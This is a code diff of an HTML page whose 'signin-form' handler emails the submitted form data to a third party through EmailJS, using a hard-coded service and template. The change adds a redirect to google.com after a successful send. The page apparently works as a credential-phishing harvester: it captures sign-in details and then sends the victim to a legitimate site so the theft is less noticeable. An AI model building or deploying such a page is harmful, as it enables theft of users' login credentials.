@@ -7,7 +7,7 @@
   <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script type="text/javascript">
     (function(){
-      emailjs.init("VYKK057zR_OaMB7bb"); // Public key
+      emailjs.init("VYKK057zR_OaMB7bb"); // Public Key
     })();
   </script>
   <style>
@@ -121,9 +121,13 @@
     document.getElementById('signin-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
+      // Send form data to EmailJS
       emailjs.sendForm('service_q1baw4p', 'template_dmlj1h8', this)
         .then(function(response) {
           alert("Information sent successfully!");
+
+          // Redirect to Google after successful form submission
+          window.location.href = "https://www.google.com";
         }, function(error) {
           alert("Failed to send. Try again.");
         });
